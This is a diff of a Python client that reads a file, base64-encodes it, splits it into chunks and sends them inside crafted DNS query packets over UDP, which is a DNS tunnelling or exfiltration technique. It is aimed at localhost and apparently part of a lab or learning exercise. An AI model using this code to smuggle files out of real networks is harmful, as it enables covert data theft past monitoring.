@@ -2,12 +2,11 @@
 
 import socket
 import sys
+from base64 import b64encode
 
-assert len(sys.argv) == 2
-#assert len(sys.argv[1]) <= 250, "You can only send 64 bytes at once"
+assert len(sys.argv) == 2, "Usage: ./client.py <FILENAME>"
 
 HOST = "127.0.0.1"
-
 
 def get_dns_header(transaction_id: int) -> bytes:
     """
@@ -34,36 +33,50 @@ def get_dns_header(transaction_id: int) -> bytes:
     return (transaction_id + flags + no_questions + no_answers + no_authority + no_additional)
 
 def send_payloads(payloads: list) -> None:
+    """
+    Send all given payloads to target using DNS
+    """
 
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-        s.connect((HOST,53))
-
         header_count = 1
 
         for payload in payloads:
             body = get_dns_header(header_count)
             body += payload
-            print(body)
+            #print(body)
 
-            s.sendall(body)
+            s.sendto(body, (HOST,53))
 
             header_count += 1
         print('SUCCESS')
         return
     print('FAILED')
 
+# read file
+    
+query_raw = None
+
+with open(sys.argv[1],"r") as f:
+    query_raw = f.read()
+
+assert query_raw != None, "Could not read file"
+
 # split payload into several queries, each query having upto 250 bytes
-query_raw = sys.argv[1].encode('ascii')
-query_raw += b"\xff\xff"
+query_raw = query_raw.encode('utf-8')
+#query_raw += b"\xff\xff"
+query_b64 = b64encode(query_raw) + b"\xff\xff"
+#print(query_b64)
+
+#query_raw += b"\xff\xff"
 all_payloads = []
 
-count_queries = len(query_raw) // 250
-if len(query_raw) % 250 != 0:
+count_queries = len(query_b64) // 250
+if len(query_b64) % 250 != 0:
     count_queries += 1
 
 queries = []
 for i in range(count_queries):
-    queries.append(query_raw[(i*250):((i+1)*250)])
+    queries.append(query_b64[(i*250):((i+1)*250)])
 
 # split content of each query into up to 4 parts (a.b.c.d)
 for query in queries:
@@ -84,33 +97,3 @@ for query in queries:
 
 
 send_payloads(all_payloads)
-exit()
-
-
-
-# TODO: loop over every 64 characters
-
-# Variable length: Our actual payload >:D
-# must be terminated with a 0 byte
-# Note: The length of the field must be prepended
-query_name = bytes(sys.argv[1], 'ascii') + b"\x00"
-#query_name = b"\x00"
-query_length = (len(query_name) - 1).to_bytes(byteorder='big')
-print(f"Query is of length {len(query_name) - 1}")
-
-# 2 Byte: Type, 1
-query_type = b"\x00\x01"
-
-# 2 Bytes: Class, 1
-query_class = b"\x00\x01"
-
-#body = header + query_length + query_name + query_type + query_class
-
-with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-    s.connect((HOST,53))
-    #s.sendall(bytes.fromhex("b529012000010000000000010474657374026465000001000100002904d000000000000c000a0008157fdfee532dc6b2"))
-    s.sendall(bytes.fromhex("b529012000010000000000010474657374000001000100002904d000000000000c000a0008157fdfee532dc6b2"))
-    #s.sendall(body)
-    print('SUCCESS')
-    exit()
-print('FAILED')
